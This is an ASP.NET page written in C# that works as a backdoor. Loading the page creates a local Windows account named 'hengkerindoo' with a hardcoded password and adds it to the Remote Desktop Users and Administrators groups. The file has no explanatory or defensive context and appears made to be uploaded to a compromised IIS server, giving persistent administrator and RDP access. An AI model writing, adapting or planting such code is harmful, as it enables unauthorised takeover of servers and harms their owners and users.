<%@ Page Language="C#" %>
<%@ Import Namespace="System.DirectoryServices.AccountManagement" %>
<%@ Import Namespace="System.Security.Principal" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string username = "hengkerindoo";
        string password = "P@ssw0rd!@123";
        string groupName = "Administrators";

        // Create a new user
        PrincipalContext ctx = new PrincipalContext(ContextType.Machine);
        UserPrincipal user = new UserPrincipal(ctx, username, password, true);
        user.Save();

        // Add the user to the Remote Desktop Users group
        GroupPrincipal rdpGroup = GroupPrincipal.FindByIdentity(ctx, "Remote Desktop Users");
        rdpGroup.Members.Add(user);
        rdpGroup.Save();

        // Add the user to the Administrators group
        GroupPrincipal adminGroup = GroupPrincipal.FindByIdentity(ctx, groupName);
        adminGroup.Members.Add(user);
        adminGroup.Save();

        Response.Write("User created and added to groups successfully!");
    }
</script>